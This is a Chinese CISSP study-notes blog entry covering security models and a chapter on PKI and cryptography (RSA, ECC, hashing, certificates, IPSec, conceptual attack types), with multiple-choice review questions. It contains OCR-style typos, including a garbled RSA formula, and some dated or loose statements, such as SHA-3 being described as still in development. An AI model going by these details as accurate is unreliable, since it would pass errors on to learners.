对计算机系统每部分的技术评估，以评估其是否符合安全标准C. 对制造商目标的功能评估，为了让每个硬件和软件组件都满足集成标准D. 制造商的证明，说明所有组件都被正确安装和配置 系统鉴定是什么?A. 正式可接受的系统配置声明B. 为了每个硬件和软件组件都满足集成标准，对制造商目标进行的功能评价C. 证明计算机系统实施安全策略的可接受的测试结果D. 指定两台机器之间的安全通信过程 封闭式系统是什么?A. 围绕着最终、封闭或标准设计的系统B. 包括工业标准的系统C. 使用未公布协议的专有系统D. 没有运行Windows的任意主机 以下哪一项更好地描述了限制或约束的过程?A. 仅可以在有限的时间下运行的过程B. 仅可以在一天中的某些时间运行的过程C. 仅可以访问某些内存空间的过程D. 对客体控制访问的过程 访问客体是什么?A. 用户或进程想要访问的资源B. 可以访问资源的用户或进程C. 有效访问规则的列表D. 有限访问类型的序列 安全控制是什么?A. 存储了描述客体特性的安全组件B. 列出所有数据分类类型的文件C. 有效的访问规则列表D. 限制访问客体的机制 信息系统安全鉴定的什么类型，是在特定的、独立的位置对应用和系统进行评估?A 系统鉴定B. 站点鉴定C. 应用鉴定D. 类型鉴定 TCSEC标准定义了几种主要类型?A. 2B. 3C. 4D. 5 可信计算基(TCB)是什么?A. 在网络上支持安全传输的主机B. 操作系统内核和设备驱动程序C. 硬件、软件和控制结合在一起实现安全策略D. 验证安全策略的软件和控制 安全边界是什么?A. 围绕系统的物理安全区域的边界B. 把TCB和系统其他部分隔离的假想边界C. 防火墙所在的网络D. 计算机系统的任何连接 TCB概念的什么部分验证了在授予每个资源需求权限前的每次访问?A. TCB分区B. 信任库C. 引用监控器D. 安全内核 安全模型的最佳定义是什么?A. 安全模型描述了组织必须遵循的策略B. 安全模型提供一个框架来实现安全策略C. 安全模型是计算机系统每部分的技术评估，以评价与它们一致的安全标准D. 安全模型是认证配置正式被接受的过程 哪个安全模型建立在状态机模型之上?A. Bell-LaPadula和Take-Grant模型B. Biba和Clark-Wilson模型C. Clark-Wilson和Bell-LaPadula模型D. Bell-LaPadula和Biba模型 哪个安全模型关注数据的机密性?A. Bell-LaPadula模型B. Biba模型C. Clark-Wilson模型D. Brewer and Nash模型 哪个Bell-LaPadula属性阻止低级别的主体访问高级别的客体?A. (星)安全属性B. 不准向上写属性C. 不准向上读属性D. 不准向下读属性 Biba模型的简单属性的含义是什么?A. 向下写B. 向上读C. 不准向上写D. 不准向下读 当可信主体违反了Bell-LaPadula模型的星安全属性时，为了把客体写入低级别，什么可行的操作可能会发生?A. 扰动B. 多实例C. 聚合D. 移除分类 什么安全方法、机制或模型揭示了一个主体访问多个客体的能力?A. 职责分离B. 访问控制矩阵C. Biba模型D. Clark-Wilson模型 什么安全模型拥有在理论上含有名称或标签的功能，但是在解决方案中实现时，需要安全内核的名称或标签?A. Graham-Denning模型B. Deployment模型C. 可信计算基D. Chinese Wall 下列哪一项不是Clark-Wilson模型的访问控制关系的一部分?A. 客体B. 接口C. 编程语言D. 主体]]></content>
      <categories>
        <category>notes</category>
      </categories>
      <tags>
        <tag>cissp</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cissp学习笔记（7）——PKI和密码学应用]]></title>
    <url>%2Fnotes%2Fcissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%887%EF%BC%89%E2%80%94%E2%80%94PKI%E5%92%8C%E5%AF%86%E7%A0%81%E5%AD%A6%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[在本章的考试大纲内容有：安全工程学 I. 密码学应用 I.2 密码学类型(例如，对称密码学、非对称密码学、椭圆曲线密码学) I.3 公钥基础设施(PKI) I.4 密钥管理实践 I.5 数字签名 I.6 数字版权管理 I.7 不可否认性 I.8 完整性(哈希和撤盐) I.9 密码分析攻击方法(例如，暴力破解、仅知密文、已知明文) 7.1 非对称密码学7.1.1 公钥与私钥 公钥密码系统依赖于为每个密码系统用户分配的一对密钥。每个用户都同时维护一个公钥和一个私钥。对于想与公钥密码系统用户通信的任何人来说，都可以从该用户那里自由获得公钥。第三方拥有的公钥不会将任何脆弱性引入密码系统。另一方面，私钥只供专人使用，这种密钥从不与其他密码系统用户共享。 发送者用接收者的公钥加密明文消息(时，从而产生密文消息(C)。当接收者打开密文消息时，他们使用自己的私钥解密密文，重新生成最初的明文消息。一旦发送者用接收者的公钥加密了消息，那么在不知道接收者的私钥(用于生成消息的公钥/私钥对的另一半)的情况下，没有用户(包括发送者)能够解密这些信息。这就是公钥密码学的优点，即可以使用不安全的通信通道自由共享公钥，并在以前并不认识的用户之间创建安全的通信信道。 7.1.2 RSA RSA算法依赖于大质数在因数分解时固有的计算难度。密码系统的每个用户都使用下列步骤描述的算法产生一对公钥和私钥： (1) 选择两个大的质数(每个质数大约200位)，用p和q来表示 (2) 计算出这两个质数的乘积，即n = p * q (3) 选择一个满足下列两项要求的数字e： e小于n e和(n一1)(q一1)互为质数 (4) 找到一个数d，使得(ed - 1)mod(p - 1)(q - 1) = 0 。 (5) 把e和n作为公钥分发给所有的密码系统用户，将d作为私钥并保持其秘密性。 如果Alice想把一条加密的消息发送给Bob，那么她会使用如下所示的公式将明文(P)加密为密文(C)，其中密钥产生过程中生成的e是Bob的公钥，n是p和q的乘积： c = p^e mod n当Bob 收到消息时，他会运用下面这个公式得到明文消息：p = c^d mod n 7.1.3 EI Gamal El Gamal 算法优于RSA 算法的一个主要方面是： 它是公开发布的。然而，EI Gamal 算法也有一个主要缺点，即用此算法加密的任何消息的长度都加倍了。当加密长信息或数据并且要在带宽较窄的通信线路上传输时，这会表现出难以克服的困难。 7.1.4 椭圆曲线密码系统(ECC) 使用下面这个方程式可以定义任何椭圆曲线： y^2 = x^3 + ax + b 在这个方程式中，x、y、a和b都是实数。每个椭圆曲线都有一个对应的椭圆曲线组，这个椭圆曲线组由椭圆曲线上的点和位于无穷大处的点O组成。在同一个椭圆曲线组中的两个点(P和Q)可以用椭圆曲线的加法算法加在一起。这个运算非常简单，如下所示： P + Q 这个问题可以被扩展以涉及乘法。假设Q是P的倍数，如下所示： Q = xP 计算机科学家和数学家相信，即使在P和Q己知的情况下，找到像x这样的数也是极其困难的。这个难题被称为椭圆曲线的离制才数问题，也是形成椭圆曲线密码学的基础。人们一般认为，解决这个问题比解决RSA密码系统依赖的质数因数分解问题和Di面e-Hellman与El Gamal应用的标准离散对数问题还要困难。前面的”密钥长度的重要性”通过具体数据阐述了这个问题，也就是1088位的RSA密钥的加密强度相当于160位的椭圆曲线密码系统密钥的加密强度。 7.2 散列函数 散列函数具有一个非常简单的用途，那就是它们接收一条可能会很长的消息，然后根据消息内容生成唯一的输出值。该值通常被称为消息摘要。消息摘要可以由消息的发送者产生，并连同完整的消息一起传送给接收者，这其中有两个原因： 首先，接收者能够使用相同的散列函数对完整的消息进行重新计算，得出消息摘要。然后，接收者将计算得出的消息摘要与传送过来的消息摘要进行比较，从而确保始发者发送的消息与接收者收到的是同一条消息。如果两个消息摘要不匹配，那么就表明消息在传送的过程中因为某种原因被修改过。其次，消息摘要可以被用于实现数字签名算法。按照RSA安全公司的标准，对密码学散列函数有下列5个基本要求： 输入值可以是任意长度。 输出值具有固定的长度。 散列函数在计算任何输入值时要相对容易。 散列函数是单向的(意味着在提供输出值时确定输入值是极其困难的)。 散列函数是不会发生冲突的(意味着找到产生相同散列值的两条消息是极其困难的) 。 7.2.1 SHA 安全散列算法(SHA)及随后衍生的SHA-l和SHA-2算法是由美国国家标准和技术协会(NIST)开发的政府标准的散列函数，并在正式的政府出版物一一安全散列标准(Secure Hash Standard，SHS)中进行了说明，此标准也被称为联邦信息处理标准(FIPS)180。SHA-l表面上可以接受任意长度的输入数据(事实上，在此算法中输入值的长度的上限大约是2097152TB)，并且生成一个160 位的消息摘要。SHA-l算法处理512位的消息分组。因此，如果消息的长度不是512的倍数，那么SHA算法就会用附加的数据填充消息，直至长度达到512的下一个最高倍数。 7.2.2 MD2 MD2散列算法由Ronald Rivest(也就是Rivest、Shamir和Adleman中的同一人)于1989年开发，是为8位处理器提供的一种安全散列函数。MD2对消息进行填充，从而使消息的长度成为16字节的倍数。然后，该算法会计算出一个16字节的校验和，并添加到消息的结尾处。最后，通过使用完整的原始消息与添加的校验和共同生成128位的消息摘要。 7.2.3 MD4 1990年，Rivest增强了其信息摘要的算法，进而支持32位的处理器并提高了安全级别。这种高级的算法被称为MD4。这个增强算法先对消息进行填充，确保消息的长度比512比特的倍数短64比特。例如，一条16比特的消息会用432比特的附加数据进行填充，使之达到448比特，这条消息的长度是比512比特的倍数短64比特。随后，MD4算法对512位的消息分皇岛挂行处理，经过三轮计算，最后的输出结果是一条128比特的消息摘要。 7.2.4 MD5 1991年，Rivest发布了其消息摘要算法的下一个版本，也就是MD5。这个算法还是处理512位的消息分组，但是使用4轮明显不同的计算生成与MD2和MD4算法一样长度的消息摘要(128位)。MD5与MD4具有同样的填充要求，即消息长度必须比512位的倍数短64位。 散列算法记忆表： 算法名称 哈希值的长度(单位为位) HAVAL(MD5变种) 128、160、192、224和256 HMAC 可变 MD2 128 MD4 128 MD5 128 SHA-1 160 SHA-224 224 SHA-256 256 SHA-384 384 SHA-512 512 7.3 数字签名 数字签名算法的基础是公钥密码学和散列函数。数字签名过程本身并不提供任何隐私保护。数字签名只是确保满足加密目标中的完整性和不可否认性。数字签名基础结构具有两个明显的目标： 数字化的签名消息可以向接收方保证： 消息确实来自己声明的发送者，并且实施了不可否认性(也就是说，排除了发送者之后声称消息是伪造的情况)。 数字化的签名消息可以向接收方保证： 消息在发送方和接收方之间进行传输的过程中不会被改变。这种方法确保消息不会受到恶意的修改(第三方想要修改消息的含义)以及无意识的修改(由通信过程中的故障造成，如电磁干扰) 。 7.3.1 HMAC HMAC算法实现了部分的数字签名功能，即保证了消息在传输过程中的完整性，但是不提供不可否认性。通过使用一个共享的密钥，HMAC 可以与任何标准的消息摘要生成算法(如SHA-2)组合在一起。因此，只有知道此密钥的通信双方能够产生或验证数字签名。如果接收方解密消息摘要，但是无法将这个消息摘要与明文消息产生的消息摘要进行成功比较，那么就说明这条消息在传输过程中被更改了。因为HMAC依赖于一个共享的密钥，所以它无法提供任何的不可否认性功能(正如前面提到的)。在不使用加密的消息摘要算法与基于公钥密码学的采用计算方式的昂贵数字签名算法之间，HMAC能够起到折中的作用。 7.3.2 数字签名标准 在美国联邦信息处理标准(FIPS)186-4中，美国国家标准和技术协会指定了联邦政府可以使用的数字签名算法，该标准也被称为数字签名标准(DSS)。这个文档指定美国联邦政府批准的所有数字签名算法都必须使用SHA-2散列函数。DSS还指定了可以被用于支持数字签名基础结构的加密算法。目前存在下面三种经过批准的标准加密算法： 数字签名算法(DSA)，在FIPS 186-4中指定。 RSA算法，在ANSI X9.31中指定。 椭圆曲线数字签名算法(ECDSA)，在ANSI X9.62中指定。 7.4 公钥基础设施(PKI) 公钥加密的主要优点是使原本互不认识的双方之间的通信变得容易。受信任的公钥基础设施(PKI)层次使得这一点成为可能。这种信任允许结合非对称和对称算法以及哈希和数字证书，为我们提供混合加密方式。 7.4.1 证书 数字证书为通信双方提供了保证，保证正在与之通信的人确实具有他们所宣称的身份。数字证书本质上是个人公钥的认可副本。当用户验证证书确实是由可信证书颁发机构(CA)发布时，他们就相信这个公钥是合法的。数字证书包含特定的身份标识信息，并且其结构归国际标准X.509决定。遵循X.509标准的证书包含下列数据： 证书遵循的X.509版本 序列号(来自证书建立者) 签名算法标识符(指定证书授权机构对证书的内容进行数字签名时使用的技术) 发布者姓名(发布证书的证书授权机构的身份标识) 有效期(指定证书有效的日期和时间：开始的日期、时间，以及结束的日期、时间) 主体的名字(包括区分实体身份的唯一名字或DN，相应实体拥有证书中包含的公钥) 主体的公钥(证书的内容：证书拥有者用于建立安全通信的实际公钥) 7.4.2 证书授权机构 证书授权机构(CA)将公钥基础设施绑定在一起。这些中立的组织机构为数字证书提供公证服务。为了从著名的CA处获得数字证书，必须亲自前往其代理机构，并且出示适当的身份识别文档。下面的列表中包括一些主要的CA： Symantec Thawte GeoTrust GlobalSign Comodo Limited Starfield Technologies GoDaddy DigiCert Network Solutions. LLC Entrust 注册授权机构(RA)在数字证书发布之前帮助CA验证用户的身份。队本身并不直接发布证书，但是在认证过程中扮演重要的角色，从而允许CA远程验证用户的身份。 7.4.3 证书的生成与撤消1. 注册 当希望获得一个数字证书时，你必须首先采用某种方式向证书授权机构证明身份，这个过程被称为注册。 2. 验证 当收到来自希望与之通信的人的数字证书时，就需要通过使用CA的公钥检查CA的数字签名来验证这个证书。接着，必须检查并确保证书并没有公布在证书撤消列表(Certificate Revocation List，CRL)中。此时，假如满足下列要求，那么就可以认定在证书中列出的公钥是可信的： CA的数字签名是可信的 你信任CA 证书没有被列在CRL中 证书实际上包含你信任的数据 3. 撤消 有时，证书授权机构会由于下列某种原因需要撤消证书： 证书遭到破坏(例如，证书所有者不慎丢失了私钥) 证书被错误地发放(例如，CA错误地发放了一个没有进行正确验证的证书) 证书的细节发生变化(例如，主体的名字发生了变化) 安全性关联发生变化(例如，担保这份证书的组织机构不再雇用主体) 可以使用下列两种技术来验证证书的可靠性以及确定撤消的证书： 证书撤消列表 证书撤消列表(CRL)由不同的证书授权机构进行维护，并且包含CA发布的己被撤消的证书的序列号以及撤消生效的日期和时间。证书撤消列表的主要缺点是它们必须定期下载并交叉参照，这样就会在证书被撤消和通知最终用户证书撤消之间存在一段时间延迟。然而，CRL仍然是今天检查证书状况的最常见方法。 联机证书状态协议(Online Certificate Status Protocol，OCSP) 这个协议通过提供实时证书验证方法消除了认证撤消列表所带来的固有延迟。当客户端收到一份证书时，就会向CA的OCSP服务器发送OCSP请求。服务器随后回应这份证书的状态(有效、无效或未知) 。 7.4.4 非对称密钥的管理 明智地选择加密系统选择算法公开的加密系统，其算法必须经过行业专家的彻底检查。慎重选择使用”黑箱”途径的加密系统和维护算法的秘密性，这对于密码系统的完整性来说至关重要。 以适当的方式选择密钥选择密钥长度时应当考虑、安全需求与性能之间的平衡。此外，应当确认密钥真正随机。密钥内的任何模式都会增加攻击者破译加密和减弱密码系统安全性的可能性。 使用公钥加密时，一定要保证私钥的机密性在任何情况下都不能允许其他人获知你的私钥。需要记住的是，偶尔允许某人访问私钥，会持久地危害使用该密钥加密的所有通信(无论是过去、当前还是将来)，并且准许第三方能够成功地进行假冒。 密钥在服务一段时期后应当停止使用许多组织机构具有强制的密码轮换需求，从而防止未被发现的密钥泄露。如果没有必须遵循的正式策略，那么可以基于密钥的使用频率选择适当的密钥轮换时间间隔。如果可能的话，可以几个月更改一次密钥对。 备份密钥如果由于数据损坏、崩溃或其他情况丢失包含私钥的文件，那么无疑希望具有可用的备份。此时，既可以创建自己的备份，也可以使用维护备份的密钥托管服务。在任何情况下，都需要确保以安全的方式处理备份。毕竟，备份与主密钥文件一样重要! 7.5 密码学的应用7.5.1 便携式设备 许多组织转向加密来保护这些设备上的数据，以防止它们被错误放置和使用。目前流行的操作系统版本都包括磁盘加密功能，使其便于应用和管理便携式设备上的数据加密。各种各样的商业工具可以提供额外的功能和管理能力。这些工具之间的主要区别在于它们是如何保护存储在内存中的密钥的，它们是否提供完整的磁盘或卷加密，以及是否将与基于硬件的可信平台模块(frusted Platform Module，TPM)进行集成并提供附加的安全性。选择加密软件的任何努力都应该包括对这些特性的分析。 7.5.2 电子邮件 对于电子邮件来说，简明就是成本效益最高的选项，不过有时密码学提供了无法避免使用的特定安全服务。因为保护安全也具有成本效益，所以加密电子邮件需要遵守下列规则： 如果在发送邮件时需要实现机密性，那么就加密邮件。 如果需要维护邮件的完整性，那么就必须对邮件进行散列运算。 如果需要实现身份认证和完整性，那么就应当对邮件进行数字化签名。 如果需要实现机密性、完整性、身份认证和不可否认性，那么就应当对邮件进行加密和数字化签名。 目前广泛使用的一些电子邮件标准： 可靠隐私(PGP)PGP有两个可用的版本。商业版本使用RSA进行密钥交换，使用IDEA进行加密/解密，使用MD5生成消息摘要。免费版本则使用Diffie-Helhnan密钥交换、Carlisle Adams/Stafford Tavares(CAST)128位的加密/解密算法以及SHA-1散列函数。 安全多用途互联网邮件扩展协议(S/MIME)S/MIME使用RSA加密算法，并且己经得到包括RSA安全公司在内的业界主要机构的支持。S/MIME依靠X.509证书交换密码系统密钥。这些证书包含的公钥被用于数字签名和较长通信会话中使用的对称密钥交换。RSA是SIMIME支持的唯一一个公钥密码学协议，这个协议支持AES和3DES 对称加密算法。 7.5.3 Web 应用 SSL协议由Netscape公司开发，提供对客户机/服务器之间的网站流量进行加密的服务。安全套接字层上的超文本传输协议(HTTPS)使用443端口在Web服务器和客户端浏览器之间协商加密通信会话。SSL依赖在浏览器与Web服务器之间交换数字证书以协商加密/解密参数。SSL协议的目标是建立安全的通信通道，使整个Web浏览器会话保持开放。它取决于对称和非对称加密的组合。具体过程涉及以下步骤： (1) 当用户访问一个网站时，浏览器检索Web服务器的证书，并从中提取服务器的公共密钥。 (2) 然后，浏览器创建一个随机的对称密钥，使用服务器的公钥来加密，然后将加密的对称密钥发送到服务器上。 (3) 随后，服务器使用自己的私钥解密对称密钥，这两个系统使用对称加密密钥来交换未来的交互信息。 隐写术(steganography)是使用密码学技术在另一条消息内嵌入秘密泊’息的方法。这种算法是通过修改组成图像文件的数据中最不重要的数据位进行工作的。变化非常微小，以至于对图像的浏览没有明显的影响。这种技术允许通信双方以简单的方式隐藏消息，例如在其他人毫无察觉的情况下，在Web页面的插图里嵌入秘密的消息。 7.5.4 数字版权管理(DRM) 数字版权管理(Digital Rights Management，DRM)软件使用加密来加强对数字媒体版权的限制。使用场景有： 音乐DRM 电影DRM 电子书DRM 视频游戏DRM 文档DRM 7.5.5 网络连接1. 链路加密 安全管理人员使用两种类型的加密技术来保护在网络上传输的数据的安全： 链路加密使用软件或硬件解决方案在两个点之间建立一条安全隧道，对进入隧道一端的所有通信数据都进行加密，并且对流出隧道另一端的所有通信数据都进行解密，从而保护整条通信线路的安全。例如，某公司通过一条数据线连接两个办公室，可以使用链路加密技术来防止攻击者在两个办公室之间的某一点进行的监控活动。 端到端加密用于保护双方仰的日，客户端和服务器)之间的通信安全，并且可以独立于链路加密实施。在发送者和接收者之间传递使用PGP的邮件，就是端到端加密的例子。这种技术可以阻止入侵者监控加密链路安全端的传输数据或者通过未加密链路传送的数据。 链路加密和端到端加密技术之间的关键差异在于： 在链路加密中，所有的数据(包括头、尾、地址和路由数据)也会被加密，因此每个数据包必须在每一跳(each hop)都被解密，这样数据包才能被正确地路由至下一跳，然后数据包在继续发送之前又被重新加密，这就降低了路由的速度。端到端加密技术不加密头、尾、地址和路由数据，因此数据包从一点移到另一点的速度加快了，但是这种技术更容易遭到嗅探器和偷听者的攻击。当加密发生在OSI模型的较高层时，通常会使用端到端加密技术; 如果加密发生在OSI模型的较低层，通常会使用链路加密技术。 2. IPSec 网络协议安全(IPSec)标准就是这样一种支持安全通信的体系结构。IPSec是由互联网工程任务组(IETF)确立的标准体系结构，并且能够在两个实体之间建立信息交换的安全信道。IPSec通过公钥密码学来提供加密、访问控制、不可否认性以及消息身份认证，井且一般使用IP协议。IPSec主要被用于虚拟专用网(VPN)，因此可以工作在运输模式或隧道模式中。IPSec通常与二层隧道协议(L2TP)在一起，成为L2TP/IPSec。IPSec协议为安全网络通信提供了完整的基础设施。IPSec已经得到广泛认可，并且现在许多商业性的操作系统中也提供了这个协议。IPSec依赖于安全关联，井且存在下列两个主要组件： 身份验证头(Authentication Header，AH)提供消息完整性和不可否认性的保证。AH还提供身份认证和访问控制，并且可以防止重放攻击。 安全封装有效载荷(Encapsulating Security Payload，ESP)提供数据包内容的机密性和完整性。ESP还提供加密和有限的身份认证，并且可以防止重放攻击。 在运行时，通过创建安全关联(Security Association，SA)来建立IPSec会话。SA表示通信会话，井且记录与特定连接有关的任何配置和状态信息。SA表示单一连接。如果期望双向信道，那么就需要两个SA，每个方向分别使用一个SA。此外，如果希望支持使用AH和ESP的双向信道，那么就需要建立4个SA。 3. ISAKMP 网络安全关联密钥管理协议(ISAKMP)通过协商、建立、修改和删除安全关联为IPSec提供后台的安全支持服务。正如你在前面一节中学到的那样，IPSec依赖于安全关联的系统。这些安全关联通过使用ISAKMP进行管理。正如在Intemet RFC 2408中阐述的一样，ISAKMP具有下列4个基本要求： 对通信对等方进行身份认证 建立并管理安全关联 提供密钥生成机制 防止遭受威胁(例如，重放和拒绝服务攻击) 4. 无线互联 有线等价隐私 安全团体最初通过引入有线等价隐私队Tired Equivalent Privacy，WEP)提供64和128位的加密边工页，从而保护无线LAN内的通信。IEEE 802.11中将WEP描述为无线网络连接标准的一个可选组件。 WiFi安全访问 通过实现临时密钥完整性协议(Temporal Key Integrity Protocol，TKIP)并消除危害WEP的密码学弱点，WPA(WiFi Protected Access)改进了WEP加密。通过将TKIP替换为AES加密算法，WPA2进一步改善了WPA技术。这两种技术都是适合现代无线网络使用的安全算法。 IEEE 802.1x是另一种常用的无线安全标准，它为有线和无线网络中的身份认证和密钥管理提供了灵活的架构。为了使用802.1x，客户端需要运行被称为supplicant的软件。supplicant软件与身份认证服务器进行通信。成功进行身份认证之后，网络交换机或无线接入点就允许客户端访问无线网络。WPA被设计为与802.1x身份认证服务器进行交互。 7.6 密码学攻击 分析攻击 这是一种试图降低算法复杂性的代数运算。分析攻击关注于算法本身的逻辑性。 实现攻击 这种攻击类型利用密码学系统的实现中的弱点，关注于对软件代码的利用，不仅仅涉及错误与缺陷，而且还涉及编写加密系统程序所使用的方法。 统计攻击 统计攻击利用密码系统中的统计弱点，例如无法生成随机数和浮点错误。统计攻击试图发现驻留密码学应用程序的硬件或操作系统中的漏洞。 蛮力攻击 蛮力攻击十分简单。这种攻击尝试每种可能的、有效的密钥或密码组合。蛮力攻击涉及使用大规模的处理能力，对保护通信安全的密钥进行有系统的猜测。针对没有缺点的协议，通过蛮力攻击发现密钥所需的平均时间与密钥的长度成正比。如果具有足够的时间，蛮力攻击总是会成功。密钥长度每增加一位，由于潜在的密钥数加倍，因此执行蛮力攻击的时间也会加倍。有两种方法可使攻击者提升蛮力攻击的效果： 彩虹表提供预先计算的密码散列值，这些通常用于破解以密码散列方式存储的系统中的密码。 专为蛮力攻击设计和开发的专业化的、可扩展的计算硬件将大大提高这种攻击方法的效率。 频率分析和仅知密文攻击 在许多情况下，你唯一拥有的信息是加密后的密文信息，即所谓的仅知密文攻击。在这种情况下，频率分析就是一种己证明可行的对抗简单密码的技术。它计算每个字母出现在密文中的次数。使用你掌握的知识，宇母E、T、0、A、I和N是最常见的英语字母，可以测试几个假设： 如果这些字母在密文中最常见，这个密码可能是移位密码，只是重新排列明文字符但不改变它们。 如果其他字母在密文中最常见，密码可能是某种形式的置换密码并代替明文字符。这是对频率分析的简单概述，这个技术的众多复杂的变种可以用来对付多表密码和其他复杂的密码。 已知明文攻击 在己知明文攻击中，攻击者具有己加密消息的副本以及用于产生密文(副本)的明文消息。知道了这些消息，可以极大地帮助攻击者破解较弱的编码。 选定密文攻击 在选定密文攻击中，攻击者能够解密所选的部分密文消息，并且可以使用己解密的那部分消息来发现密钥。 选定明文攻击 在选定明文攻击中，攻击者能够加密所选的明文消息，随后可以分析加密算法输出的密文。 中间相遇攻击 攻击者可以使用中间相遇攻击击败使用两轮加密的加密算法。这种攻击导致双重DES(2DES)很快被抛弃，并且转而使用三重DES(3DES)这种增强的DES 加密技术。在中间相遇攻击中，攻击者使用己知的明文消息。然后，使用每一种可能的密钥(kl)加密明文，同时使用所有可能的密钥(k2)解密相当的密文。当发现存在匹配时，相应的密钥对(kl，k2)就代表了双重加密的两个部分。这种类型的攻击通常只需花费破解一轮加密算法(或2n，而不是预计的2n* 2n)所需时间的两倍，一轮加密算法提供了最小强度的附加保护措施。 中间人攻击 在中间人攻击中，怀有恶意的人置身于通信双方之间的位置并截获所有的通信(包括密码学会话的设置)。攻击者对始发者的初始化请求做出响应，井且建立与始发者的安全会话。然后，攻击者伪装成始发者，使用不同的密钥与预期的接收者建立另一个安全会话。这样一来，攻击者就能够”坐在”通信双方的中间，读取流经的所有数据流。 生日攻击 生日攻击也被称为冲突攻击或逆向散列匹配，它能够寻找散列函数一一对应特性中的缺陷。在这种攻击中，怀有恶意的人在数字化签名的通信中寻找可以生成相同消息摘要的不同消息，从而维持原有数字签名的有效性。 重放攻击 重放攻击被用于对付那些没有结合临时保护措施的加密算法。在这种攻击中，怀有恶意的人拦截通信双方之间的加密消息(通常是身份认证的请求)，然后”重放”捕获的信息以打开新的会话。通过在每条消息中结合时间标记和过期时间，就可以防御这种攻击。 7.7考试要点 理解在非对称密码系统中使用的密钥类型 公钥在通信参与者之间是自由共享的，而私钥是要求保密的。为了加密消息，应当使用接收方的公钥。为了解密消息，应当使用自己的私钥。为了签名信息，也应当使用自己的私钥。为了验证签名，应当使用发送者的公钥。 熟悉三种主要的公钥密码系统 1977年，由阳vest、Shamir和Adleman开发的RSA 是最著名的公钥密码系统，依赖于对质数乘积进行因数分解的难度。El Gamal是Diffie-Hellman密钥交换算法的扩展，依赖于模运算。椭圆曲线加密算法依赖于椭圆曲线离散对数问题，在密钥的长度相同时，能提供比其他算法更高的安全性。 知道散列函数的基本要求 优秀的散列函数具有5 个要求： 它们必须允许任意长度的输入值，提供固定长度的输出值，使得计算任意输入值的散列函数相对简单，提供单向功能并且是无冲突的。 熟悉4种主要的散列算法 安全散列算法(SHA)的后继算法SHA-l和SHA-2构成了政府标准的消息摘要函数。SHA-l生成160位的消息摘要，SHA-2支持最大512位的可变长度的消息摘要，SHA-3还在开发制定中，而NIST 稍晚些将发布最终版本。 知道密码加盐如何提高密码散列的安全性 当直接使用在密码文件中散列存储的密码时，攻击者可能利用预先计算值的彩虹表来识别常用的密码。在散列之前将盐添加到密码中，降低了彩虹表攻击的有效性。 理解如何产生和验证数字签名 为了数字化签名消息，首先要使用散列函数生成消息摘要。然后，用自己的私钥加密消息摘要。为了验证消息中的数字签名，需要使用发送者的公钥解密签名，随后将解密得到的消息摘要与自己产生的消息摘要进行比较。如果二者匹配，那就说明接收的消息是可信的。 了解数字签名标准(DSS)的组件 数字签名标准使用SHA-l和SHA-2消息摘要函数和下列三种加密算法中的一种： 数字签名算法(DSA) 、RSA算法或椭圆曲线数字签名算法(ECDSA)。 理解公钥基础设施(PKI ) 在公钥基础设施中，证书授权机构(CA)生成包含系统用户的公钥的数字证书。然后，用户把这些证书分发给希望进行通信的人。证书接收方会使用CA的公钥来验证证书。 了解常见的保护电子邮件安全的密码学应用 用于被加密消息的新兴标准是S/MIME协议。其他流行的电子邮件安全协议包括Phil Zimmerman的可靠隐私(PGP)。电子邮件加密的大多数用户依赖于将这项技术构建到他们的电子邮件客户端或他们的基于Web的电子邮件服务。 了解常见的保护Web 活动安全的密码学应用 安全Web通信的事实标准是使用安全传输层协议(TLS)或旧的安全套接字层(SSL)上的HTTP。大多数的网络浏览器都支持这两种标准。 了解常见的保护网络连接安全的密码学应用 IPSec协议标准提供了加密网络通信的通用架构，并且被内建在许多常见的操作系统中。IPSec的运输模式针对对等通信方式加密数据包的内容，隧道模式则针对网关间的通信方式加密整个数据包(包括头信息)。 能够描述IPseco IPSec是一种在IP上支持安全通信的安全体系架构 IPSec来用运输模式或隧道模式建立安全的信道。它既可以被用于在计算机之间建立直接的通信，也可以被用于在网络之间建立VPN。IPSec使用两个协议： 身份验证头(AH)和封装安全有效载荷(ESP) 。 解释常见的密码学攻击类型 穷举攻击(又称蛮力攻击)试图通过随机的组合找到正确的加密密钥。己知明文攻击、选定密文攻击和选定明文攻击都要求攻击者具有除了密文以外的其他一些信息。中间相遇攻击利用了使用两轮加密的协议。中间人攻击是欺骗通信双方与攻击者进行通信，而不是通信双方彼此之间直接通信。生日攻击尝试找到散列函数中的冲突。重放攻击则企图重用身份认证请求。 了解数字版权管理(DRM)的用途 数字版权管理(DRM)解决方案允许内容所有者执行对内容的使用限制。DRM解决方案通常保护娱乐内容，如音乐、电影和电子书，但偶尔也可见于企业中，用于保护文档中存储的敏感信息。 7.8 复习题 在RSA公钥密码系统中，下列哪个数字总是最大?A. eB. nC. pD. q El Gamal密码体系的基础是什么加密算法形式?A. RSAB. Diffie-HellmanC. 3DESD. IDEA 如果Richard要发送一条用公钥密码系统加密过的消息给Sue，他用哪个密钥加密这条消息?A. Richard 的公钥B. Richard 的私钥C. Sue 的公钥D. Sue 的私钥 如果用El Gamal公钥密码系统加密一条2048位的明文消息，产生的密文信息有多长?A. 1024 位B. 2048 位C. 4096 位D. 8192 位 Acme Widgets目前在全公司范围内使用1024位的RSA加密标准。该公司计划从RSA转换成椭圆曲线加密系统。如果要保持相同的加密强度，应该使用多长的ECC密钥?A. 160 位B. 512 位C. 1024 位D. 2048 位 John 想要产生2048位的消息摘要，并计划发送给Mary。如果他使用SHA-l散列算法，这条特定消息的消息摘要的长度是多少?A. 160 位B. 512 位C. 1024 位D. 2048 位 下列哪个技术被认为是有缺陷的并且不应该再被使用?A. SHA-2B. PGPC. WEPD. TLS WPA使用什么加密技术保护无线通信?A. TKIPB. DESC. 3DESD. AES Richard收到Sue发送给他的加密消息。他应该用什么密钥来解密消息?A . Richard 的公钥B. Richard 的私钥C. Sue 的公钥D. Sue 的私钥 Richard想要对正在发送给Sue的消息进行数字签名，以便于Sue能够确认这条消息来自于他，没有在传输过程中被篡改。他应该使用什么密钥来加密这条摘要消息?A. Richard 的公钥B. Richard 的私钥C. Sue 的公钥D. Sue 的私钥 下列哪个算法不受数字签名标准支持?A. 数字签名算法B. RSAC. El Gamal DSAD. Elliptic Curve DSA 哪个国际电信联盟(ITU)标准用于管理安全电子通信中的数字证书的创建和支持?A. X.500B. X.509C. X.900D. X.905 什么密码系统为商业版的Phil Zimmerman的PGP(可靠隐私)安全邮件系统提供加密/解密技术?A. ROT13B. IDEAC. 